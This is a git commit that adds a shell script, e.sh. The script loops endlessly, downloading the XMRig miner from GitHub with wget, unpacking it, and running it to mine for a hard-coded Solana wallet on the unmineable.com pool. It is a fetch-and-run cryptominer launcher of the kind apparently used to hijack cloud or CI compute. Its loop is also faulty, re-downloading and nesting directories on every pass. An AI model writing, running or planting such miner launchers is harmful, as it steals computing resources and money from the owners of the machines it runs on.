975b27761a3386851b5a9358970641c02131db0b
Ibnu3998 <97282161+Ibnu3998@users.noreply.github.com>
2022-06-28 17:47:35 +0700

    Add files via upload

---
+++ e.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+while [ 1 ]; do
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz ; tar -xf xmrig-6.12.1-linux-x64.tar.gz; cd xmrig-6.12.1; ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SOL:2YnX8LpfbLuKUmWmJw3yV5M5nuCrfkgCBJj1LScceomu.rigku#tz6w-gbkp
+done
